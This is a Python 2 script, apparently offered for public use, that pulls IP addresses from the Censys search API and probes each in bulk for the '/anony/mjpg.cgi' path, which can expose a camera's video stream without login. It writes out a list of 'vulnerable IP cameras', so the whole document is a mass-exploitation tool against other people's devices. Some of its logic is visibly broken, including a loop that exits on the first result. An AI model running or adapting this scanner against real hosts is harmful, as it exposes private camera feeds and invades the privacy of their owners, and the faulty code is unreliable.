import sys
from sys import argv
import censys.ipv4
import requests
from socket import timeout
import Queue
from threading import Thread
from time import sleep
from subprocess import call



# Print iterations progress (not from me, found on http://stackoverflow.com/questions/3173320/text-progress-bar-in-the-console)
def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
	global start_time
	formatStr       = "{0:." + str(decimals) + "f}"
	percents        = formatStr.format(100 * (iteration / float(total)))
	filledLength    = int(round(barLength * iteration / float(total)))
	bar             = '#' * filledLength + '-' * (barLength - filledLength)
	sys.stdout.write('\r%s |%s| %s%s %s' % (prefix, bar, percents, '%', suffix)),
	if iteration == total:
        	sys.stdout.write('\n')
    	sys.stdout.flush()



#Exploit Url vulnerability function
def exploitUrl(url,g):
	exploiturl = url + "/anony/mjpg.cgi"
	r=requests.head(exploiturl,timeout=3)
	final = url
	if r.status_code==200:
		final = exploiturl
	if final != url:
		print >> g, final
	
#Connection function
def connect(url,f,g):
	r =requests.head(url,timeout=3)
	if r.status_code == 401:
			print >> f, hostname
			exploitUrl(url,g)
	sleep(0.1)
	global progress
	global ipNumber
	progress = progress + 1
	printProgress(progress, ipNumber, prefix = 'Progress:', suffix = 'Complete', barLength = 50)

#Grab data from the queue function
def grab_data_from_queue():
	while not q.empty():
		url = q.get()
		try:
			connect(url,f,g)
		except requests.exceptions.RequestException as e:
			global progress
			global ipNumber
			progress = progress + 1
			printProgress(progress, ipNumber, prefix = 'Progress:', suffix = 'Complete', barLength = 50)
		q.task_done()
			

#Main 
q = Queue.LifoQueue()
progress = 0
ipNumber = 0

#API Account Parameters
API_URL = "https://www.censys.io/api/v1"
UID = "" #Complete with your own UID
SECRET = "" #Complete with your own SECRET

#Query Parameters
query = ""
if len(argv) < 4:
	print "Wrong usage : python scanner_public.py [query] [page_number]"
	sys.exit()
for n in range(1,len(argv)-1):
	query = query + str(" ") + (argv[n]).strip()
try:
	p=int(argv[len(argv)-1])
except ValueError:
	print "Wrong usage : python scanner_public.py [query] [page_number]"
	sys.exit()
	
fields = ["ip", "location.country_code"] #location.country_code not used for the moment

#Query execution
print "Contacting Censys Database..."
c=censys.ipv4.CensysIPv4(api_id=UID, api_secret=SECRET)
f = open('tmp','w')
g = open('ips','w')
for ipadress in c.search(query, page=p, fields=fields):
	if ipNumber < 9999: #limited to 10 000 results with this API
		break
	hostname = ipadress["ip"]
	url = "http://"+ipadress["ip"]
	q.put(url)
	ipNumber = ipNumber + 1

#Testing Vulnerabilities
print "Testing Vulnerabilities... (on " + str(ipNumber) + " cameras)"
printProgress(progress, ipNumber, prefix = 'Progress:', suffix = 'Complete', barLength = 50)
for i in range(4):
	t1 = Thread(target = grab_data_from_queue)
	t1.start() 
q.join()

#End of the program
f.close()
g.close()
print "Vulnerable IP cameras :"
call(["cat", "ips"])
call(["rm","tmp"])







